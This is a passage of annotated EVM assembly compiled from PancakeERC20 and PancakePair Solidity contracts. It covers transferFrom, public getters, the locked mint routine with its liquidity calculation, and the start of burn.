allowance[from][msg.sender].sub(... */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3277:3448  if (allowance[from][msg.sender] != uint256(-1)) {... */\n    tag_187:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3457:3483  _transfer(from, to, value) */\n      tag_189\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3467:3471  from */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3473:3475  to */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3477:3482  value */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3457:3466  _transfer */\n      tag_190\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3457:3483  _transfer(from, to, value) */\n      jump\t// in\n    tag_189:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3500:3504  true */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":698:814  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_69:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":748:814  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":698:814  bytes32 public constant PERMIT_TYPEHASH =... */\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":308:343  uint8 public constant decimals = 18 */\n    tag_71:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":341:343  18 */\n      0x12\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":308:343  uint8 public constant decimals = 18 */\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":557:588  bytes32 public DOMAIN_SEPARATOR */\n    tag_73:\n      sload(0x04)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":501:550  mapping(address => uint256) public _frozenBalance */\n    tag_76:\n      mstore(0x20, 0x03)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1047:1079  uint public price0CumulativeLast */\n    tag_78:\n      sload(0x0c)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1085:1117  uint public price1CumulativeLast */\n    tag_80:\n      sload(0x0d)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5025:6290  function mint(address to) external lock returns (uint liquidity) {... */\n    tag_83:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5074:5088  uint liquidity */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1300  unlocked */\n      sload(0x0f)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1304:1305  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1305  unlocked == 1 */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1284:1325  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_192\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_192:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1343  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1347  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5143:5156  getReserves() */\n      tag_194\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5143:5154  getReserves */\n      tag_54\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5143:5156  getReserves() */\n      jump\t// in\n    tag_194:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5204:5210  token0 */\n      sload(0x08)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5230:5234  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5100:5156  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5181:5194  uint balance0 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5204:5210  token0 */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5221  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5204:5210  token0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_195\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_195:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_196\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_196:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_197\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_197:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5269:5275  token1 */\n      sload(0x09)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5295:5299  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      swap3\n      swap4\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5246:5259  uint balance1 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5269:5275  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5286  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5269:5275  token1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_198\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_198:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_199\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_199:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_200\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_200:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      mload\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5311:5323  uint amount0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5326:5349  balance0.sub(_reserve0) */\n      tag_201\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5326:5334  balance0 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5326:5349  balance0.sub(_reserve0) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5326:5338  balance0.sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5326:5349  balance0.sub(_reserve0) */\n      and\n      jump\t// in\n    tag_201:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5311:5349  uint amount0 = balance0.sub(_reserve0) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5359:5371  uint amount1 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5374:5397  balance1.sub(_reserve1) */\n      tag_202\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5374:5382  balance1 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5374:5397  balance1.sub(_reserve1) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5374:5386  balance1.sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5374:5397  balance1.sub(_reserve1) */\n      and\n      jump\t// in\n    tag_202:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5359:5397  uint amount1 = balance1.sub(_reserve1) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5408:5418  bool feeOn */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5421:5451  _mintFee(_reserve0, _reserve1) */\n      tag_203\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5430:5439  _reserve0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5441:5450  _reserve1 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5421:5429  _mintFee */\n      tag_204\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5421:5451  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_203:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5461:5478  uint _totalSupply */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5481:5492  totalSupply */\n      sload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5408:5451  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5584:5601  _totalSupply == 0 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5580:5974  if (_totalSupply == 0) {... */\n      tag_205\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5629:5683  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      tag_206\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":556:563  10 ** 3 */\n      0x03e8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5629:5660  Math.sqrt(amount0.mul(amount1)) */\n      tag_169\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5639:5659  amount0.mul(amount1) */\n      tag_208\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5639:5646  amount0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5651:5658  amount1 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5639:5659  amount0.mul(amount1) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5639:5650  amount0.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5639:5659  amount0.mul(amount1) */\n      and\n      jump\t// in\n    tag_208:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5629:5638  Math.sqrt */\n      tag_209\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5629:5660  Math.sqrt(amount0.mul(amount1)) */\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5629:5683  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n    tag_206:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5617:5683  liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      swap9\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5697:5733  _mint(address(0), MINIMUM_LIQUIDITY) */\n      tag_210\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5711:5712  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":556:563  10 ** 3 */\n      0x03e8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5697:5702  _mint */\n      tag_211\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5697:5733  _mint(address(0), MINIMUM_LIQUIDITY) */\n      jump\t// in\n    tag_210:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5580:5974  if (_totalSupply == 0) {... */\n      jump(tag_212)\n    tag_205:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5831:5963  Math.min(... */\n      tag_213\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5894  amount0.mul(_totalSupply) / _reserve0 */\n      dup10\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5882  amount0.mul(_totalSupply) */\n      tag_214\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5864  amount0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5869:5881  _totalSupply */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5882  amount0.mul(_totalSupply) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5868  amount0.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5882  amount0.mul(_totalSupply) */\n      and\n      jump\t// in\n    tag_214:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5894  amount0.mul(_totalSupply) / _reserve0 */\n      dup2\n      tag_215\n      jumpi\n      invalid\n    tag_215:\n      div\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5949  amount1.mul(_totalSupply) / _reserve1 */\n      dup10\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5937  amount1.mul(_totalSupply) */\n      tag_216\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5919  amount1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5924:5936  _totalSupply */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5937  amount1.mul(_totalSupply) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5923  amount1.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5937  amount1.mul(_totalSupply) */\n      and\n      jump\t// in\n    tag_216:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5949  amount1.mul(_totalSupply) / _reserve1 */\n      dup2\n      tag_217\n      jumpi\n      invalid\n    tag_217:\n      div\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5831:5839  Math.min */\n      tag_218\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5831:5963  Math.min(... */\n      jump\t// in\n    tag_213:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5819:5963  liquidity = Math.min(... */\n      swap9\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5580:5974  if (_totalSupply == 0) {... */\n    tag_212:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6003:6004  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5991:6000  liquidity */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5991:6004  liquidity > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5983:6047  require(liquidity > 0, \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\") */\n      tag_219\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_219:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6057:6077  _mint(to, liquidity) */\n      tag_220\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6063:6065  to */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6067:6076  liquidity */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6057:6062  _mint */\n      tag_211\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6057:6077  _mint(to, liquidity) */\n      jump\t// in\n    tag_220:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6088:6137  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_221\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6096:6104  balance0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6106:6114  balance1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6116:6125  _reserve0 */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6127:6136  _reserve1 */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6088:6095  _update */\n      tag_179\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6088:6137  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_221:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6151:6156  feeOn */\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6147:6194  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n      iszero\n      tag_222\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6185:6193  reserve1 */\n      sload(0x0b)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6166:6194  uint(reserve0).mul(reserve1) */\n      tag_223\n      swap1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6171:6179  reserve0 */\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6185:6193  reserve1 */\n      swap1\n      div\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6166:6194  uint(reserve0).mul(reserve1) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6166:6184  uint(reserve0).mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6166:6194  uint(reserve0).mul(reserve1) */\n      and\n      jump\t// in\n    tag_223:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6158:6163  kLast */\n      0x0e\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6158:6194  kLast = uint(reserve0).mul(reserve1) */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6147:6194  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n    tag_222:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6249:6283  Mint(msg.sender, amount0, amount1) */\n      0x40\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup6\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6254:6264  msg.sender */\n      caller\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6249:6283  Mint(msg.sender, amount0, amount1) */\n      0x4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f\n      swap3\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log2\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1379:1380  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1376  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1380  unlocked = 1 */\n      sstore\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5025:6290  function mint(address to) external lock returns (uint liquidity) {... */\n      swap5\n      swap7\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":381:425  mapping(address => uint256) public balanceOf */\n    tag_86:\n      mstore(0x20, 0x01)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1123:1140  uint public kLast */\n    tag_88:\n      sload(0x0e)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":820:861  mapping(address => uint256) public nonces */\n    tag_91:\n      mstore(0x20, 0x05)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7789:9218  function burn(... */\n    tag_94:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7852:7864  uint amount0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7866:7878  uint amount1 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1300  unlocked */\n      sload(0x0f)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1304:1305  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1305  unlocked == 1 */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1284:1325  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_225\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_225:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1343  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1347  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7933:7946  getReserves() */\n      tag_227\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7933:7944  getReserves */\n      tag_54\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7933:7946  getReserves() */\n      jump\t// in\n    tag_227:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7989:7995  token0 */\n      sload(0x08)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8038:8044  token1 */\n      sload(0x09)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8119:8123  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7890:7946  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap5\n      swap7\n      pop\n      swap3\n      swap5\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7989:7995  token0 */\n      swap2\n      dup3\n      and\n      swap4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8038:8044  token1 */\n      swap2\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7971:7986  address _token0 */\n      0x00\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7989:7995  token0 */\n      dup5\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8110  IERC20(_token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7989:7995  token0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n   